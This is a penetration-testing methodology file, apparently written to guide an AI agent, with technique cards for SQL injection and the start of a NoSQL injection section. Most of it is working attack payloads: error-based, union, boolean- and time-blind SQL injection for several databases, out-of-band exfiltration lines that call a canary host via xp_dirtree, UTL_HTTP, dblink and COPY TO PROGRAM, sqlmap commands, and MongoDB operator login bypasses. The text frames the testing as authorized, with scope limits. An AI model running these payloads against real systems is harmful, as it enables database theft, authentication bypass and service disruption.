# Phase 3 — Injection Sweep

Technique cards for the INJECTION class. Driven by `targets/<target>/coverage.md`, row by row.
Scope, ROE, and the anti-miss rules are in `../CLAUDE.md` — they are not repeated here. Surface
enumeration and fingerprinting are in `00-surface-and-ledger.md`. WAF blocks, parser differentials,
and out-of-band channels are in `03-bypass-and-blind.md`. Disclosure findings that hand you new
surface go back through `00-surface-and-ledger.md` section 2.6.

How to use this file: take a ledger row, read the sink-selection table, open the one card, work
Detect → Confirm → Escalate, write the row state with the payload you used. Do not read the whole
file per row.

## 3.0 Sink selection

What the input looks like, or where you saw it land → which card.

| Signal you have | Card |
|---|---|
| Value ends up in a list, filter, sort, search, pagination, or report query | 3.1 SQL injection |
| Input is a bag of user-defined keys — `labels`, `tags`, `metadata`, `filter[k]=v`, `{key,value}` pairs | 3.1 SQL injection, **key** position |
| JSON body to an API on Node/Mongo; login with `{"user":..,"pass":..}` | 3.2 NoSQL injection |
| Filename, hostname, IP, archive name, image op, conversion, `ping`/`nslookup`/`whois` feature | 3.3 Command injection |
| Your input comes back inside a page with your name/greeting/label rendered into it | 3.4 SSTI |
| `.action`/`.do` URLs, Spring app, validation message echoes your value, `#{...}` anywhere | 3.5 EL / OGNL / SpEL |
| Any XML, SOAP, SAML, SVG, DOCX/XLSX/PPTX upload, RSS/sitemap importer, `Content-Type: */xml` | 3.6 XXE / XML injection |
| Long opaque base64 in a cookie or param; `rO0`, `H4sI`, `AAEAAAD`, `O:`, `gASV`, `/wp`, `BAh` | 3.7 Deserialization |
| Directory-service login, user lookup by `uid`/`cn`/`mail`, "corporate SSO" | 3.8 LDAP injection |
| XML-backed search or config lookup, `xpath=` style params, XML user store | 3.9 XPath / XQuery |
| Any parameter holding a filename, path, template name, locale, theme, page, include, download id | 3.10 Path traversal / LFI / RFI |
| Any parameter holding a URL, hostname, webhook target, callback, image src, import-from, proxy | 3.11 SSRF as URL injection |
| Value reflected into `Location:`, `Set-Cookie:`, any response header, or a log line | 3.12 CRLF / header injection |
| `Host` reaches the app; absolute URLs in email or page are built from the request | 3.13 Host header injection |
| Proxy/CDN/LB in front, keep-alive, HTTP/2 downgrade, inconsistent `Transfer-Encoding` handling | 3.14 Request smuggling |
| JSON merge, config object, query-string parsing, Node backend, client-side option objects | 3.15 Prototype pollution |
| Value reflected into HTML, JS, an attribute, a URL, or written by JS into the DOM | 3.16 XSS |
| Any "Export to CSV/XLSX" feature that contains user-controlled text | 3.17 CSV / formula injection |
| Value lands in a log, a Java app, `User-Agent` logging, anything with `${` interpolation | 3.18 Log injection / log4shell-class |
| `/graphql`, `/api/graphql`, `/v1/graphql`, POST with `query`/`variables` | 3.19 GraphQL injection |
| Invite/notify email you can shape; HTML→PDF export; Markdown/BBCode comment box | 3.20 SSTI-adjacent |
| Anything you stored earlier that is rendered somewhere you have not looked yet | 3.21 Second-order |
| Ledger is huge, time is short, breadth needed first | 3.22 Polyglots |

Two rules from `../CLAUDE.md` that decide most misses: a vector gets the mandatory shortlist for its shape and
you may never narrow it by what the field is *called* (rule 4), and a WAF block is `suspicious`, never negative
(rule 6).

Before you mark any row here `tested-negative`, open `04-false-negatives.md`. Most of what this card set misses
is not a missing payload — it is a clean-looking result that was not a negative. F.9 is the one-minute version.

---

## 3.1 SQL injection

**What it is.** User input becomes part of an SQL statement. Still the highest-impact injection class
and still everywhere behind ORMs, in report builders, and in `ORDER BY`.

**Where it hides.**

| Place | Notes |
|---|---|
| `sort`, `order`, `orderby`, `dir`, `sort_by`, `column` | goes into `ORDER BY`, no quotes, ORM does not parameterise it |
| `limit`, `offset`, `page`, `per_page`, `rows` | integer context, no quotes |
| `filter`, `q`, `search`, `where`, `fq`, `criteria` | dynamic `WHERE` built by string concat |
| `labels`, `tags`, `metadata`, `annotations`, `attributes`, `customFields`, `filters[]`, `where{}` | map-shaped filter — the **key** becomes a column name or JSON path and cannot be bound. High-yield, see below |
| `id`, `uid`, `pid`, `ref`, any numeric-looking value | integer context — quotes never help, `1 AND 1=1` does |
| Export / report endpoints (`/report?cols=a,b,c`) | column and table names interpolated |
| `Cookie`, `X-Forwarded-For`, `User-Agent`, `Referer` | logging inserts, analytics tables, geo lookups, "last seen IP" |
| JSON keys, GraphQL variables, XML element text | see `00-surface-and-ledger.md` 2.3 rule on names |
| Auth: `username`, `email`, token lookup, password reset token | reset-token lookups are often raw SQL |
| Bulk/batch endpoints (`ids=1,2,3`) | joined into `IN (...)` |
| Second-order: profile field read back by an admin report | see 3.21 |

**High-yield vector — map-shaped and key-value filters.** Named because it is the shape that survives code
review. Any API that accepts a bag of *user-defined* keys:

```
labels  tags  metadata  annotations  attributes  properties  customFields  extra
filters[]  where{}  facets  params{}  match{}  selector  dimensions  options
```

...as `{key, value}` pairs, a map, or a list of pairs. Why it pays:

- The **value** can be bound, and almost always is.
- The **key** must become a column name, a JSON path, or a document field. No driver can bind any of those.
  It is *structurally forced* into the statement text.
- So the endpoint looks parameterised and is not. This is the "second parameter" miss with a name.
- These filters usually sit in a `WHERE` over a large table, which makes timing probes dangerous here
  specifically — see the second `RISK:` under **Time-blind**.

| Transport | What it looks like | Key position to attack |
|---|---|---|
| GraphQL input object | `assets(labels: [KeyValueInput!])` with `input KeyValueInput {key: String!, value: String!}`; `FilterInput {field, op, value}` | `labels[].key`, `filter.field`, `filter.op`, `orderBy.field` |
| GraphQL nested search | `assetSearchSuggestions(input: {labelFilter: [{key,value}]})` | `input.labelFilter[].key` — a second route to the same builder |
| Hasura / PostGraphile style | `where: {metadata: {_contains: {KEY: "v"}}}`, `_has_key`, `_has_keys_any` | the map key inside `_contains` / `_has_key` |
| REST bracket filter | `?filter[env]=prod`, `?filter[metadata.team]=eng`, `?where[tags][env]=x` | the bracket contents |
| REST dotted filter | `?tags.env=prod`, `?metadata.owner=me`, `?sort=KEY`, `?fields=a,b` | the path before `=` |
| JSON body, nested map | `{"filters":{"env":"prod"}}`, `{"labels":[{"key":"env","value":"prod"}]}` | the object keys, and the `key` members (`../CLAUDE.md` 6.3) |
| OData | `$filter=metadata/env eq 'prod'`, `$orderby=KEY`, `$select=KEY`, `$expand=KEY`, `$apply=groupby((KEY))` | the property name |
| JSON:API | `filter[metadata.env]=prod`, `sort=-KEY`, `fields[type]=KEY` | the property name |
| Elastic / OpenSearch passthrough | `{"query":{"term":{"KEY":"v"}}}` | the field name — see 3.2 |
| gRPC-gateway / protobuf `map<string,string>` | a `labels` map field, usually flattened to `labels.KEY=v` | the map keys |

Find them fast: in GraphQL introspection (3.19) grep the schema for input objects with a `key` field, for
type names containing `KeyValue`, `Filter`, `Label`, `Tag`, `Meta`, and for `JSON`/`Map`/`Any` custom
scalars. In Burp history grep query strings for `[` and for `.` inside a parameter name. In a JS bundle grep
for the operation's variable shape.

**Ledger rule: when an input is a pair or a map, every part of it is a separate row** (`../CLAUDE.md` 6.1,
6.3). For `{key:"env", value:"prod"}` you owe at least three rows — the key, the value, and the
operator/comparator if the schema has one (`op`, `_eq`, `match`, `mode`, `caseSensitive`). Also vary the
*number* of pairs: a second pair often takes a different code path, because the `AND` chain is built in a
loop and only the first element gets the careful treatment.

Say this one plainly, because it is the mistake that loses the bug: **testing the value, finding it bound,
and marking the row `tested-negative` tells you nothing about the key.** They are different code paths in
the same statement. A bound value is weak evidence *for* key injection, not against it — it means the
developer reached for a parameterised API and had to concatenate whatever that API could not bind.

**Detect.** Baseline first (`00-surface-and-ledger.md` 2.4). Non-destructive, in this order.

Syntax-error probes (string context):
```
'
"
\
')
'))
`
'"
%27
```

**Confirm step — quote parity ladder.** The cheapest high-confidence signal that your input lands in a
concatenated string literal. No data is touched. Three requests, same parameter, nothing else changed:

| # | Value sent | Expected if the value is concatenated into a string literal |
|---|---|---|
| 1 | `test'` | error / 500 / status or length change — the literal is left open |
| 2 | `test''` | back to baseline — even count closes itself, reads as one escaped quote |
| 3 | `test'''` | error again — odd count, literal open again |

Odd breaks, even does not. The *alternation* is the signal, not any single error. One error on a lone `'`
is weak; the ladder is what makes it strong enough to write down.

Identifier and JSON-path contexts use other quote characters — run the same ladder there:
````
test"      test""      test"""       Postgres/Oracle/MSSQL quoted identifier, JSON path string
test`      test``      test```       MySQL/MariaDB backtick identifier
test]      test]]                    MSSQL bracket identifier
````
Read the outcomes:

| Pattern across 1 / 2 / 3 | Meaning | Ledger state |
|---|---|---|
| error / clean / error | string context, concatenated | `suspicious` → go straight to a boolean pair |
| clean / clean / clean | parameterised, or the value never reaches SQL | `tested-negative` with these three payloads recorded (`../CLAUDE.md` 6.2) |
| error / error / error | **not** a SQL signal. Generic input validation: allow-list regex, a validator that rejects `'` at any count, or a WAF | `suspicious`, identify the blocker in `03-bypass-and-blind.md` B.2 |
| clean / error / clean | escaping applied then re-parsed (double-decode), or a stored-procedure layer | `suspicious`, try the `\` and `%27` variants and B.3 |

It works with no response body at all. The parity rides on the status code alone: `200 / 500 / 200 / 500`
across `test` / `test'` / `test''` / `test'''` is the same finding on an endpoint that answers `204`, a bare
`{}`, or a GraphQL `"errors":[{"message":"Internal server error"}]` with the detail scrubbed. Response
length and error-code class work the same way. Always send the clean baseline as request 0 so you have four
data points, and save all four (`../CLAUDE.md` 8).

Boolean pairs — the diff between the two is the signal, not either response alone:
```
' AND '1'='1
' AND '1'='2
' OR '1'='1'-- -
1 AND 1=1
1 AND 1=2
1' AND '1
1 /*!50000AND*/ 1=1
```
Arithmetic / concat probes for numeric and string context (no quotes needed):
```
1+1
2-1
1*1
id=2-1        -> should return record 1 if evaluated
' 'a          -> MySQL implicit concat
'||'a         -> Oracle/Postgres concat
'+'a          -> MSSQL concat
```
`ORDER BY` / column-name context, where quoting is useless (JSON and document-path keys are the same
problem and have their own table in the ORM subsection below — a key that becomes a `jsonb` path or a
`JSON_EXTRACT` argument cannot be bound either):
```
sort=id,(select 1)
sort=(case when 1=1 then id else name end)
sort=1
sort=999                 -> error if column count exceeded
sort=id desc,(select 1)
sort=id--
sort=id/**/asc
```
`LIMIT` context (MySQL, after `LIMIT n`):
```
limit=1 PROCEDURE ANALYSE(1,1)
limit=1,1 into @a,@b
```

**DB fingerprint.** Cheapest first: version concat probes; then error text.

| Probe | True on |
|---|---|
| `' AND (SELECT @@version) IS NOT NULL-- -` | MySQL, MSSQL |
| `' AND (SELECT version()) IS NOT NULL-- -` | MySQL, PostgreSQL |
| `' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL-- -` | Oracle |
| `' AND (SELECT sqlite_version()) IS NOT NULL-- -` | SQLite |
| `' AND 1=CAST(@@version AS int)-- -` | MSSQL (leaks version in the cast error) |
| `' AND 1=CAST(version() AS int)-- -` | PostgreSQL (leaks version) |
| `' AND 1=(SELECT 1 FROM dual)-- -` | Oracle (needs `FROM`) |
| `' AND CONNECTION_ID()=CONNECTION_ID()-- -` | MySQL only |
| `' AND SUBSTR('abc',1,1)='a'-- -` | Oracle/SQLite/Postgres |
| `' AND SUBSTRING('abc',1,1)='a'-- -` | MySQL/MSSQL |

Comment styles differ — if one is filtered, try the others:
```
-- -        all (needs trailing space or dash)
#           MySQL
/**/        all
;%00        some parsers
--%0a       MySQL newline trick
```

**Error-based.** Fastest confirm when errors surface.

MySQL/MariaDB:
```
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -
' AND json_extract('{"a":1}',concat('$.',(SELECT database())))-- -
```
PostgreSQL:
```
' AND 1=CAST((SELECT current_database()) AS int)-- -
' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS int)-- -
' AND CAST((SELECT version()) AS numeric)>0-- -
```
MSSQL:
```
' AND 1=CONVERT(int,(SELECT db_name()))-- -
' AND 1=CAST((SELECT @@version) AS int)-- -
' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')-- -
' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- -
```
Oracle:
```
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE rownum=1))-- -
' AND XMLType((SELECT user FROM dual)) IS NOT NULL-- -
```
SQLite:
```
' AND 1=load_extension('a')-- -            (usually disabled; error text confirms SQLite)
' AND 1=abs(-9223372036854775808)-- -      integer overflow error
```

**Union.** Find column count, then find a string-typed column.
```
' ORDER BY 1-- -      ... increment until error
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 'a',NULL,NULL-- -            find the printable column
```
Per DB, once you know the shape:
```
MySQL      ' UNION SELECT 1,concat(schema_name,':') ,3 FROM information_schema.schemata-- -
MySQL      ' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
Postgres   ' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables-- -
Postgres   ' UNION SELECT NULL,current_user||':'||current_database(),NULL-- -
MSSQL      ' UNION SELECT NULL,name,NULL FROM sys.tables-- -
MSSQL      ' UNION SELECT NULL,(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('users')),NULL-- -
Oracle     ' UNION SELECT NULL,table_name,NULL FROM all_tables-- -
Oracle     ' UNION SELECT NULL,banner,NULL FROM v$version-- -    (Oracle needs FROM, use FROM dual)
SQLite     ' UNION SELECT NULL,group_concat(name),NULL FROM sqlite_master WHERE type='table'-- -
SQLite     ' UNION SELECT NULL,sql,NULL FROM sqlite_master-- -   (full schema in one shot)
```
Type-mismatch fix when `NULL` is rejected: cast everything, e.g. Postgres
`' UNION SELECT NULL,CAST(table_name AS text),NULL ...`.

**Boolean-blind.** One-bit oracle per request. Use the baseline hash to decide true/false.
```
MySQL      ' AND ASCII(SUBSTRING((SELECT database()),1,1))>109-- -
Postgres   ' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>109-- -
MSSQL      ' AND UNICODE(SUBSTRING((SELECT db_name()),1,1))>109-- -
Oracle     ' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>109-- -
SQLite     ' AND UNICODE(SUBSTR((SELECT sqlite_version()),1,1))>49-- -
generic    ' AND (SELECT COUNT(*) FROM information_schema.tables)>10-- -
```
Where you have no visible difference at all but a distinct error page, an intentional division by zero
makes a second oracle:
```
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)-- -
```

**Time-blind.** ROE cap: max 5s sleep, max 3 time probes per parameter (`../CLAUDE.md` 2).
```
MySQL      ' AND SLEEP(3)-- -
MySQL      ' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(3),0)-- -
MySQL      ' OR 1=1 AND SLEEP(3)-- -                (stacked-free)
MySQL      ' AND (SELECT 1 FROM (SELECT SLEEP(3))x)-- -    (needed inside subquery contexts)
Postgres   ' AND (SELECT pg_sleep(3)) IS NOT NULL-- -
Postgres   ' AND CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END IS NOT NULL-- -
MSSQL      '; WAITFOR DELAY '0:0:3'-- -
MSSQL      ' IF (1=1) WAITFOR DELAY '0:0:3'-- -
Oracle     ' AND 1=(SELECT count(*) FROM all_users t1,all_users t2 WHERE 1=1)-- -   heavy query
Oracle     ' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)=1-- -    (preferred, cheap)
SQLite     ' AND 1=(SELECT randomblob(50000000) FROM sqlite_master)-- -
```
RISK: `BENCHMARK(10000000,MD5(1))`, Oracle cartesian joins, and SQLite `randomblob` are CPU burners and
count as DoS on a shared DB. Use `SLEEP`/`pg_sleep`/`WAITFOR`/`DBMS_PIPE.RECEIVE_MESSAGE` instead. If
none of those work, go out-of-band rather than heavier.

RISK: **the delay you observe can be a multiple of the sleep you asked for.** If the sink sits in an
expression the engine evaluates *per row* — a `WHERE` clause on an unfiltered table, a JSON path filter (see
the map-shaped filter vector above), a `CASE` in a `SELECT` list, a correlated subquery — then
`SLEEP`/`pg_sleep` is called once per row. In the label-key finding, `pg_sleep(5)` came back in about 15s.
On a large table that is not a probe, it is an outage, and an outage is a policy violation
(`../CLAUDE.md` 2, and stop-and-ask in 4). A 5s sleep is not safe just because 5s is the cap.

Safe ordering:

1. Boolean oracle first, always. Timing is only ever a confirm, never the exploration channel
   (`03-bypass-and-blind.md` B.8).
2. Start at **1-2s, not 5s**, any time the sink could be row-evaluated. Assume it is row-evaluated until
   you have evidence otherwise.
3. Limit the rows before you sleep, if you can: `AND id = <your own record>`, a filter you know is
   selective, `LIMIT 1`, or wrap the sleep in a `CASE` that is only true for one row.
4. Pick the lowest sleep that clears the *measured* noise floor — baseline median plus IQR from B.8, not
   a guess.
5. **Abort if the first probe returns at more than about 3x what you asked for.** That is per-row
   evaluation. Do not raise the sleep. Do not repeat it "to confirm". Record the multiplier in `notes.md`,
   go back to the boolean oracle, and if you still need timing, re-probe at the lowest value with a
   row-limiting predicate.
6. The caps still apply on top: 3 time probes per parameter, 5s absolute. With a multiplier in play your
   real ceiling is well under 5s — at 3x, a 1s sleep is already a 3s response.

Report the multiplier. "`pg_sleep(1)` in the label key returned in 3.1s, consistent with per-row
evaluation" is stronger impact evidence than a bare 5s delay, and it shows you handled the target carefully.

**Stacked queries.** Only where the driver allows it (MSSQL, Postgres, SQLite, PHP+PDO with emulation,
usually not MySQLi single-query).
```
'; SELECT 1-- -
'; SELECT @@version-- -
1; SELECT 1-- -
```
RISK: never stack a write. Proof stops at a `SELECT` (`../CLAUDE.md` 2). Do not run
`xp_cmdshell`, `sp_OACreate`, `COPY ... FROM PROGRAM`, `lo_import`, `ATTACH DATABASE`, or
`SELECT ... INTO OUTFILE` — that is RCE and file write. Instead report stacked-query capability plus
the DB user's privilege level (`SELECT current_setting('is_superuser')`, `SELECT IS_SRVROLEMEMBER('sysadmin')`,
`SELECT super_priv FROM mysql.user WHERE user=substring_index(user(),'@',1)`) and let the program decide.

**Out-of-band.** For fully blind sinks with no timing signal. Callback setup in `03-bypass-and-blind.md`.
```
MySQL (Windows)  ' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.CANARY.oast.fun\\a')))-- -
MySQL            ' AND (SELECT ... INTO OUTFILE '\\\\host\\share\\a')      RISK: file write, do not use
Postgres         ' AND (SELECT 1 FROM dblink('host=CANARY.oast.fun user=a dbname=a','SELECT 1') AS t(x int))-- -
Postgres         COPY (SELECT '') TO PROGRAM 'nslookup CANARY.oast.fun'   RISK: RCE, ask operator first
MSSQL            '; EXEC master..xp_dirtree '\\CANARY.oast.fun\a'-- -
MSSQL            '; EXEC master..xp_fileexist '\\CANARY.oast.fun\a'-- -
Oracle           ' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('CANARY.oast.fun') FROM dual) IS NOT NULL-- -
Oracle           ' AND (SELECT UTL_HTTP.REQUEST('http://CANARY.oast.fun/') FROM dual) IS NOT NULL-- -
Oracle           ' AND (SELECT DBMS_LDAP.INIT('CANARY.oast.fun',80) FROM dual) IS NOT NULL-- -
Oracle           ' AND (SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://'||(SELECT user FROM dual)||'.CANARY.oast.fun/">%p;]>'),'/l') FROM dual) IS NOT NULL-- -
```
Put the canary label in the hostname so the DNS hit is attributable to a specific (vector, payload).
See 3.23.

**ORM angle.** ORMs parameterise values, not identifiers or raw fragments.

| Stack | Sink that is not safe |
|---|---|
| Hibernate HQL/JPQL | `createQuery("from User where name='"+n+"'")`; HQL has no comments, no `UNION`, but supports subselects: `' or 1=1 or ''='` and `' and (select count(*) from User)>0 or ''='` |
| Spring Data | `@Query(nativeQuery=true)` with string concat; `Sort.by(userInput)` → `ORDER BY` injection; `Pageable` sort params `?sort=name,asc` |
| ActiveRecord (Rails) | `where("name = '#{n}'")`, `order(params[:sort])`, `pluck(params[:col])`, `group`, `joins`, `find_by_sql`, `exists?(params[:x])` |
| Sequelize | `sequelize.query` with `:replacements` missing; `where: {name: req.query.n}` is safe, `Sequelize.literal(n)` is not; `order: [[n,'ASC']]` |
| Knex / TypeORM | `knex.raw`, `whereRaw`, `orderByRaw`; TypeORM `where("x = '"+v+"'")` — use `:param` |
| Django | `.extra(where=[...])`, `.raw()`, `RawSQL()`, `annotate(x=RawSQL(...))`, `.order_by(request.GET['o'])`, `.values_list(*cols)`, `filter(**{key: v})` with attacker-controlled key |
| SQLAlchemy | `text()` with f-string, `filter(text(...))`, `order_by(text(user_input))` |
| .NET EF | `FromSqlRaw($"...{v}")`, `ExecuteSqlRaw`, Dapper with string interpolation |
| PHP Eloquent | `whereRaw`, `orderByRaw`, `DB::raw`, `selectRaw` |

Identifier-context payloads, where every quote-based payload fails:
```
sort=name)--
sort=name,1
sort=(select case when 1=1 then name else id end)
cols=name,(select version())
cols=name FROM users;--
table=users WHERE 1=1 UNION SELECT ...
sort=name` , (select 1) `          MySQL backtick identifier break
```
Django `order_by` also accepts `-` prefix and `__` relation traversal — `?o=author__password` is an
identifier-context info leak even without SQL syntax.

**JSON / document key and path contexts.** Same class as an identifier, and now the most common version of
it. A driver cannot bind a column name; it cannot bind a JSON path either. So in a `{key, value}` filter the
value gets a placeholder and the key gets concatenated into the statement text. **A parameterised value
sitting next to a concatenated key is the normal shape here, not the exception.** Seeing `$1` / `?` / `@p0`
in a leaked statement proves nothing about the key beside it.

| Stack | Sink shape | Where your key lands | Detect payload (in the **key**) |
|---|---|---|---|
| Postgres `jsonb`/`json` | `col -> 'KEY'`, `col ->> 'KEY'`, `col #> '{A,B}'`, `col #>> '{A,B}'` | inside a single-quoted literal, or a `{...}` path array | `k'` parity ladder, then `k' = 'v' AND 1=1 AND col ->> 'k` |
| Postgres path functions | `jsonb_extract_path(col,'KEY')`, `jsonb_extract_path_text(col,'A','B')` | quoted argument list | `k','b` — adds a path element, row count changes |
| Postgres containment | `col @> '{"KEY":"v"}'`, `col ? 'KEY'`, `col ?& array['KEY']` | inside a JSON string literal | `k":"v"}' AND 1=1-- -` ; parity with `k"` and `k\"` |
| MySQL / MariaDB | `JSON_EXTRACT(col,'$.KEY')`, `col->'$.KEY'`, `col->>'$.KEY'`, `JSON_CONTAINS(col,'v','$.KEY')` | quoted `$.` path string | `k') = 'v` , `k'),'$.a')='` , parity on `'` |
| MSSQL | `JSON_VALUE(col,'$.KEY')`, `OPENJSON(col,'$.KEY')`, `WITH (x nvarchar(50) '$.KEY')` | quoted `$.` path string | `k') = 'v` , parity on `'` and `]` |
| Oracle | `JSON_VALUE(col,'$.KEY')`, `JSON_EXISTS(col,'$.KEY')`, dot notation `t.col.KEY` | quoted path, or a bare identifier in dot notation | `k') = 'v` ; dot notation is an identifier — `col.k,dump(1)` |
| SQLite | `json_extract(col,'$.KEY')`, `col ->> '$.KEY'` | quoted `$.` path string | `k') = 'v` , parity on `'` |
| Mongo / Elastic / Cosmos behind a query builder | field path string in a generated filter | same structural problem, different syntax | see 3.2 |

Worked example, from a real finding. The generated Postgres statement was:
```sql
<jsonb expression> '<KEY>' = $4  AND "assets"."lifecycle_state" = $5
```
The label **value** was bound as `$4`. The label **key** was concatenated. Payloads that keep the
placeholder count intact, so the statement still executes:
```
parity only          env'                    env''                   env'''
boolean oracle       env' = 'prod' AND 1=1 AND <jsonb expression> 'env
                     env' = 'prod' AND 1=2 AND <jsonb expression> 'env
error extraction     env' = 'prod' AND 1=CAST((SELECT current_user) AS int) AND <jsonb expression> 'env
version              env' = 'prod' AND 1=CAST(version() AS int) AND <jsonb expression> 'env
```
Re-opening the expression at the end is the trick: `$4` keeps an operand, so you get a clean true/false
instead of a bind error. Compare `totalCount` or the row count between the `1=1` and `1=2` requests — that is
your oracle (`03-bypass-and-blind.md` B.8).

Notes that decide the result:
- **The bind-count error is itself proof.** If you comment out the tail instead (`env'-- -`), the `$4`
  operand disappears and Postgres answers `bind message supplies 5 parameters, but prepared statement ""
  requires 3` — that wording is stable across versions, grep for `bind message supplies`. On MySQL and MSSQL
  the wording varies by driver and many drivers count placeholders *client-side* and fail before the server
  sees the statement, so match on the shape (a parameter-count or missing-parameter complaint naming a number)
  rather than a fixed string.
  That error says your key text reached the statement *text* while the value stayed bound. It is cheap,
  harmless, touches no data, and is the single clearest evidence line for the report.
- **Read the error class, not just "there was an error".** A malformed *path* fails differently from
  broken *SQL*. Postgres: `22P02 invalid input syntax for type json` or `invalid json path` = path parser,
  inconclusive; `42601 syntax error at or near` = concatenation, confirmed. MySQL:
  `Invalid JSON path expression` vs `You have an error in your SQL syntax`. MSSQL:
  `JSON path is not properly formatted` vs `Incorrect syntax near`.
- A JSON path is a **string**, so `'` is your break character even though the sink looks structural. Path
  metacharacters (`$ . [ ] *`) only exercise the path parser and will read as negative.
- Dotted paths give you a free low-noise probe: a key of `a.b.c` or `$.a.b` that changes the result count
  means the key is being interpreted as a path, which means it is in the statement text.

**Confirm.**
1. Two requests that differ in one character and produce a deterministic, repeatable difference
   (boolean pair), or a value from the DB that you did not supply (version string, DB name).
2. Repeat 3 times. Cached CDN responses and flaky apps fake positives.
3. For time-based: same payload with `SLEEP(0)` must be fast, `SLEEP(3)` must be slow, three times.
4. Save request + response to `evidence/` (`../CLAUDE.md` 8).
5. `sqlmap` may confirm, but reproduce by hand — a scanner hit alone is `suspicious` (`../CLAUDE.md` 8).

`sqlmap` invocation that stays inside ROE:
```
sqlmap -r req.txt --batch --level=5 --risk=1 --delay=0.2 --threads=1 \
  --technique=BEUS --time-sec=3 --no-cast --flush-session \
  --tamper=space2comment --dbms=mysql --schema
```
`--risk=1` only. `--risk=3` issues `OR`-based payloads that can match every row in an `UPDATE`-adjacent
statement. Never `--os-shell`, `--file-write`, `--sql-query` with a write, or `--dump` of a real table.

**Escalate — stop at proof.**

| Step | What is enough |
|---|---|
| DB version + user + DB name | `version()`, `user()`, `database()` |
| Privilege level | superuser/sysadmin/FILE flags — states whether RCE is reachable, without doing it |
| Schema | table and column names via `information_schema` / `sys.tables` / `sqlite_master` |
| One record | `COUNT(*)` of a sensitive table, plus **one** row (ideally your own test account) as evidence |
| Auth bypass | log in as your own second test account via the injection, screenshot |
| Stop | no full dumps, no other users' rows, no file read/write, no `xp_cmdshell` |

Write impact as: "authenticated SQLi in `sort` on `/api/orders`, MySQL 8.0.32, user `app@localhost`,
schema extracted, `COUNT(*) FROM users` = 41,203". That is a critical without dumping anything.

**Commonly missed.**
- `ORDER BY` / `LIMIT` / column-name contexts. Every scanner sends `'` and gets a clean 200 because
  the sink has no quotes. `sort=1` vs `sort=(select 1)` is the test.
- Integer contexts. Same reason — `id=1'` errors harmlessly or 404s, `id=2-1` returns record 1.
- Headers and cookies. Logging and analytics inserts are raw SQL far more often than user-facing queries.
- Second-order: value stored clean, then concatenated by a nightly report or admin view (3.21).
- JSON keys and GraphQL variable names, not just values.
- The second parameter. Devs parameterise the obvious one and concatenate the filter next to it.
- The key half of a key/value filter. `labels`, `tags`, `metadata`, `filter[...]` — value bound, key
  concatenated. Value tested and bound is not a result for the key. See the map-shaped filter vector above.
- WAF answered 403 → row is `suspicious`, go to `03-bypass-and-blind.md`, not `tested-negative`.
- `sqlmap` said no. It tests values in the shapes it knows. It does not know your app's identifier sinks.

---

## 3.2 NoSQL injection

**What it is.** Input changes the *structure* of a query object instead of a string. No quotes involved;
the bug is that a string parameter became an operator object.

**Where it hides.**

| Place | Notes |
|---|---|
| Login / token endpoints taking JSON | `{"user":"x","pass":"y"}` → `db.users.findOne(req.body)` |
| Form-encoded bodies on an Express+Mongo app | `qs` parsing turns `user[$ne]=x` into an object |
| Search and filter endpoints that forward `req.query` into `find()` | `find(req.query)` is common |
| Sort/projection params | `?sort[a]=1`, `?fields[$where]=...` |
| `$where`, `mapReduce`, `$accumulator`, `$function` | server-side JS, present when `javascriptEnabled` is on |
| Aggregation pipeline passed from the client | `?pipeline=[{"$lookup":...}]` |
| GraphQL filter args that map to Mongo | `where: {name: {ne: null}}` |
| Elasticsearch `q=` passthrough, Kibana-style `query` objects | query DSL injection |

**Detect.** Operator injection, JSON body:
```json
{"user":{"$ne":null},"pass":{"$ne":null}}
{"user":"admin","pass":{"$ne":"x"}}
{"user":{"$gt":""},"pass":{"$gt":""}}
{"user":{"$in":["admin","administrator","root"]},"pass":{"$ne":1}}
{"user":{"$regex":"^adm"},"pass":{"$ne":1}}
{"user":{"$exists":true},"pass":{"$exists":true}}
{"id":{"$nin":[]}}
{"role":{"$not":{"$eq":"user"}}}
```
Same thing through form encoding / query string (type juggling — this is the one agents skip):
```
user[$ne]=x&pass[$ne]=x
user=admin&pass[$ne]=x
user[$regex]=^a&pass[$ne]=x
user[$gt]=&pass[$gt]=
id[$nin][]=
filter[$where]=1
search[$regex]=.*
```
URL-encoded variants when brackets are stripped:
```
user%5B%24ne%5D=x
user.%24ne=x            (some parsers, and Mongo dotted-path handling)
```
String-context probes (input is concatenated into a JS string or a `$where`):
```
'
"
\
'\"`{\r\n}$
a'||'1'=='1
a"||"1"=="1
'; return true; var x='
1;return true
' || 1==1//
' && this.password.match(/.*/)//
```
`$where` and JS sinks:
```json
{"$where":"1==1"}
{"$where":"this.a=='1'||'1'=='1'"}
{"$where":"function(){return true}"}
{"$where":"sleep(2000)"}
{"$expr":{"$eq":[1,1]}}
{"$expr":{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}}
```
RISK: `{"$where":"while(true){}"}` and long `sleep()` are DoS — `$where` runs per document. Cap at
`sleep(2000)` and one document-bounded query. Prefer boolean `$regex` extraction over timing.

